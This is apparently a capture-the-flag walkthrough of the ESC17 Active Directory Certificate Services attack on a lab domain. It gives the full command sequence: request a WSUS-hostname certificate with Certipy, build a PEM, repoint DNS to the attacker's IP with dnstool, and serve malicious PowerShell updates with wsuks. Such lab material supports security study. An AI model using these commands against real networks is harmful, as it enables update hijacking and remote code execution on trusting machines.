ESC17 is an ADCS attack where an attacker obtains a valid certificate for a WSUS server hostname, allowing them to impersonate the HTTPS WSUS server and serve malicious updates to trusting clients.

Install the PR:

```bash
source certipy-venv/bin/activate  
git clone https://github.com/ly4k/Certipy.git  
cd Certipy  
git fetch origin pull/344/head:pr344  
git checkout pr344  
pip install .
```


Request certificate using the template `UpdateSrv` and specifying `wsus.logging.htb` as the certificate's DNS name.

```bash
certipy req -k -no-pass -target dc01.logging.htb -template UpdateSrv -ca logging-DC01-CA -dns wsus.logging.htb
```

Extracts the **public certificate** from `wsus.pfx` and saves it as `wsus.crt`

```bash
certipy cert -pfx wsus.pfx -nokey -out wsus.crt
```

Extracts the **private key** from `wsus.pfx` and saves it as `wsus.key`

```bash
certipy cert -pfx wsus.pfx -nocert -out wsus.key
```

Combines the certificate `wsus.crt` and private key `wsus.key` into a single PEM file `wsus.pem`

```bash
cat wsus.crt wsus.key > wsus.pem
```

Update DNS record pointing `wsus.logging.htb` to the attackers IP `10.10.15.107`.

```bash
python3 /opt/krbrelayx/dnstool.py -u 'logging.htb\jaylee.clifton' -k --record 'wsus.logging.htb' -dns-ip 10.129.11.248 --action add --data 10.10.15.107 --type A 'dc01.logging.htb' 
```

Now that we are impersonating the WSUS server, we use wsuks to deliver a malicious update containing our chosen command to any clients that connect.

```bash
sudo wsuks --serve-only --WSUS-Server wsus.logging.htb --tls-cert wsus.pem -I tun0  -c '/accepteula powershell <commands>'
```
